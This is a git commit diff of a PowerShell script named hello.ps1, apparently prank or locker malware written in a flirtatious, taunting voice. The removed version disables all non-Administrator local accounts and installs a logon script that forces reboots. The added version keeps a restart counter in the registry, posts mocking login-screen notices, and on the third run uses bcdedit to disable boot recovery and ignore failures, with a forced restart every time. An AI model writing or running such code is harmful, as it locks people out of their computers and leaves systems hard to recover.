3b8d888f34861ab2ab1d8966a88243ca071c574a
Pancake <71461975+zpancakee@users.noreply.github.com>
2025-03-02 17:42:25 +0100

    Add files via upload

--- hello.ps1
+++ hello.ps1
@@ -1,93 +1,45 @@
-# hello
-$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
-foreach ($user in $users) {
-    if ($user.Name -ne "Administrator") {
-        Disable-LocalUser -Name $user.Name
-        Write-Host "Disabled user: $($user.Name)"
-    }
+# Define registry path for tracking restart progress
+$regPath = "HKLM:\SOFTWARE\TeaseLock"
+if (!(Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
 }
 
-# hehe
-$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-New-ItemProperty -Path $regPath -Name "LegalNoticeCaption" -Value "Oops~! Seems Like You Can't Log In" -PropertyType String -Force
-New-ItemProperty -Path $regPath -Name "LegalNoticeText" -Value "Oh, darling~ Looks like the login door is closed for now~. No entry for you~! But don't worry, you'll be back again soon, won't you? <3" -PropertyType String -Force
-
-# cannot login anymore :(
-$logonScript = @"
-echo 'Ah~ Looks like login is temporarily locked, sweetie~ <3' > C:\Users\Public\Documents\LoginTease.txt
-echo 'You’ll have to wait~ You can try again later, if you behave~ ;)' >> C:\Users\Public\Documents\LoginTease.txt
-echo 'Here’s a little something for you to admire~ ;)' >> C:\Users\Public\Documents\LoginTease.txt
-echo '' >> C:\Users\Public\Documents\LoginTease.txt
-echo '      /\\_/\\' >> C:\Users\Public\Documents\LoginTease.txt
-echo '     ( o.o )  <-- Looks like you\'re not getting in anytime soon~ <3' >> C:\Users\Public\Documents\LoginTease.txt
-echo '      > ^ <' >> C:\Users\Public\Documents\LoginTease.txt
-echo '' >> C:\Users\Public\Documents\LoginTease.txt
-echo 'Oh, don\'t pout~ I’ll be back to tease you more~ ;)' >> C:\Users\Public\Documents\LoginTease.txt
-shutdown /r /f /t 10
-"@
-
-$logonScriptPath = "C:\Windows\System32\GroupPolicy\User\Scripts\Logon\TeaseLoginScript.bat"
-$logonScript | Out-File -FilePath $logonScriptPath -Force
-
-# stubborn moment
-gpupdate /force
-
-# :3
-# First restart: Teasing and restart
-function FirstRestartTease {
-    $TeaseMessage = @"
-╔════════════════════════════╗
-║                          <3│
-║   "You thought you'd get in? │
-║        Guess again, sweetheart~" │
-║        I'm stubborn like that <3 │
-╚════════════════════════════╝
-"@
-    Write-Host $TeaseMessage
-    Start-Sleep -Seconds 2
-    shutdown /r /f /t 0
+# Get the current restart count (default to 0 if not set)
+$restartCount = (Get-ItemProperty -Path $regPath -Name "RestartCount" -ErrorAction SilentlyContinue).RestartCount
+if ($restartCount -eq $null) {
+    $restartCount = 0
 }
 
-# Second restart: More teasing and restart again
-function SecondRestartTease {
-    $TeaseMessage2 = @"
-╔════════════════════════════╗
-║   "Stubborn? Oh yes, I am! ;) │
-║  Ready for round two, my darling? │
-║      This time, you'll have to wait~ │
-╚════════════════════════════╝
-"@
-    Write-Host $TeaseMessage2
-    Start-Sleep -Seconds 2
-    shutdown /r /f /t 0
+# Modify the Windows Login Screen to Display Teasing Messages
+$systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+
+if ($restartCount -eq 0) {
+    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
+    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Ah~ Sweetheart, you're locked out <3 Try again later~ ;)" -PropertyType String -Force
+    $restartCount = 1
 }
 
-# Final restart: teasing and corrupting the system (network boot screen)
-function FinalRestartTease {
-    $TeaseMessage3 = @"
-╔════════════════════════════╗
-║   "You tried, but you failed~ │
-║      See you never again, love! <3 │
-║   Bye-bye, sweetheart~" │
-╚════════════════════════════╝
-"@
-    Write-Host $TeaseMessage3
-    # Creating a "corrupt" situation by disabling the bootable drive and causing a network boot screen
+elseif ($restartCount -eq 1) {
+    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Persistent, aren't we?" -PropertyType String -Force
+    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Round two, darling~? You’ll have to wait longer this time~ ;)" -PropertyType String -Force
+    $restartCount = 2
+}
+
+elseif ($restartCount -eq 2) {
+    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh dear~ You really tried..." -PropertyType String -Force
+    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Too bad, love~ No more chances <3 See you never~!" -PropertyType String -Force
+
+    # Apply "corruption" by disabling recovery and forcing a network boot
     bcdedit /set {current} bootstatuspolicy ignoreallfailures
     bcdedit /set {current} recoveryenabled no
     bcdedit /set {default} bootmenupolicy legacy
-    shutdown /r /f /t 0
+
+    # Reset the restart count so the process can be repeated if needed
+    $restartCount = 0
 }
 
-# Check if this is the first, second, or final restart based on a flag file
-if (Test-Path "C:\first_restart_done.txt") {
-    if (Test-Path "C:\second_restart_done.txt") {
-        FinalRestartTease
-    } else {
-        SecondRestartTease
-        New-Item "C:\second_restart_done.txt" -ItemType File
-    }
-} else {
-    FirstRestartTease
-    New-Item "C:\first_restart_done.txt" -ItemType File
-}
+# Save the updated restart count
+Set-ItemProperty -Path $regPath -Name "RestartCount" -Value $restartCount -Force
+
+# Restart the PC
+shutdown /r /f /t 5
